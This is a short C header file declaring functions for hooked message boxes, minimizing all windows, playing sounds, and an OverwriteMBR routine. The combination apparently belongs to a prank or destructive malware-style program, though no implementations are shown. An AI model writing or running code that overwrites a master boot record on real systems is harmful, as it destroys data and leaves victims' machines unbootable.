#pragma once

int SpecialMsgBoxA(TCHAR *szText, TCHAR *szCaption, UINT uType);
LRESULT CALLBACK HookMsgBoxA(int nCode, WPARAM wParam, LPARAM lParam);
int SpecialMsgBoxB(TCHAR *szText, TCHAR *szCaption, UINT uType);
LRESULT CALLBACK HookMsgBoxB(int nCode, WPARAM wParam, LPARAM lParam);

VOID MinimizeAll();
VOID UndoMinimizeAll();
VOID PlaySoundM(LPWSTR sound);
VOID OverwriteMBR(LPCVOID mbr);